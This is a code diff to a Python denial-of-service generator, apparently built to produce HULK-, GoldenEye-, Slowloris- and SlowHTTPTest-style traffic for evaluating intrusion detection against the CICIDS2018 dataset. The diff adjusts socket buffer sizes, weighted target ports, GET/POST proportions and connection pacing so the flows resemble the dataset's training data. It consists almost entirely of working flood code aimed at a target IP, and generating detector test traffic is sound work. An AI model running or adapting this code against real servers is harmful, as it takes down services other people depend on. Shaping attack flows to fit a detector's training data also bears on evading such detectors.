@@ -17,12 +17,12 @@ import random
 import string
 
 # TCP receive buffer sizes → Init Fwd Win Byts feature.
-# Values derived from CICIDS2018 training data medians.
+# Values derived from CICIDS2018 training data analysis:
 # SO_RCVBUF set BEFORE connect() controls TCP SYN window size.
-_RCVBUF_HULK = 26883       # Training median: 26883 (was 225, didn't match training)
-_RCVBUF_GOLDENEYE = 26883  # Training median: 26883 ✓
-_RCVBUF_SLOWLORIS = 26883  # Training median: 26883 ✓
-_RCVBUF_SLOWHTTPTEST = 26883  # Training median: 26883 ✓
+_RCVBUF_HULK = 8192        # Training mode: 8192 (56.8% of TCP flows) ✓
+_RCVBUF_GOLDENEYE = 8192   # Training mode: 8192 ✓
+_RCVBUF_SLOWLORIS = 8192   # Training mode: 8192 ✓
+_RCVBUF_SLOWHTTPTEST = 8192  # Training mode: 8192 ✓
 
 # ──────────────────────────────────────────────────────────
 # Randomization pools (mimic HULK / GoldenEye header variety)
@@ -263,10 +263,11 @@ class DoSAttack:
     def goldeneye_attack(self):
         """GoldenEye DoS: One HTTP GET or POST per NEW TCP connection.
         Each flow has ~4 fwd packets and ~358 bytes, matching training data.
+        60% GET, 40% POST. 2-3 second delays between NEW connections.
         
         VARIATION: Random ports, variable packet sizes for realistic patterns."""
         end_time = time.time() + self.duration
-        ports = [80, 8080, 8888, 3000, 5000, 443]
+        ports = [80, 8080, 8888]  # Most traffic on 80, but vary for realism
         
         while self.running and time.time() < end_time:
             try:
@@ -275,13 +276,13 @@ class DoSAttack:
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_GOLDENEYE)
                 
-                # VARIATION: Random destination port
-                attack_port = random.choice(ports)
+                # VARIATION: Random destination port (weighted to port 80)
+                attack_port = random.choices([80, 8080, 8888], weights=[85, 10, 5])[0]
                 sock.connect((self.target_ip, attack_port))
 
-                # VARIATION: GET vs POST, variable sizes
+                # VARIATION: 60% GET, 40% POST (matching CICIDS2018 spec)
                 if random.random() < 0.6:
-                    # GET with cache busting
+                    # GET with cache busting (70-100 bytes typical)
                     path = "/" + _random_string(random.randint(4, 12)) + _random_url_params(random.randint(2, 10))
                     req = (
                         f"GET {path} HTTP/1.1\r\n"
@@ -323,7 +324,8 @@ class DoSAttack:
             except Exception:
                 pass
 
-            # THROTTLED: Variable delay for realistic spacing (2-3 sec matches training)
+            # CRITICAL: 2-3 second delay between NEW connections (matches CICIDS2018 GoldenEye tool)
+            # This throttles the attack to realistic flow generation rate
             time.sleep(random.uniform(2.0, 3.0))
 
     # ──────────────────────────────────────────────────────
